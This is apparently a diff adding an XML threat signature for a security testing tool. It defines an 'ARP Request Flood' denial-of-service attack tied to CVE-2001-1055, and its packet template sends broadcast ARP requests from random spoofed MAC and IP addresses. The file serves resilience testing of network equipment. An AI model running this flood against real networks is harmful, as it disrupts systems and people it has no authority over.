@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ARP Request Flood"/>
+    <EngDesc display="true" value="This threat queries the target for a MAC address from multiple spoofed MAC addresses and IPs.  Can cause an exhaustion of resources on the target computer while answering all of the ARP requests."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Implementation_Exploitation"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="ARP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="FreeBSD"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Network"/>
+      <item value="Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Network"/>
+      <item value="Layer"/>
+      <item value="ARP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2001-1055"/>
+    <bugtraqID display="true" value="3113"/>
+    <OSVDB display="true" value="14118"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="6404d371915987cf83a0a0a3c08d0e39"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725856836250000"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="5"/>
+    <Regex display="false" value="\X00\X00\X00\X00\X00\X00"/>
+    <Created value="1155320229" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="queryIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" destMac="FF:FF:FF:FF:FF:FF" pktType="0806">
+      <ARP hwAddrType="0001" protoAddrType="0800" hwAddrSize="6" protoAddrSize="4" op="1" srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" srcIP="@random(0.0.0.0, 255.255.255.255)" destMac="00:00:00:00:00:00" destIP="$queryIP"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
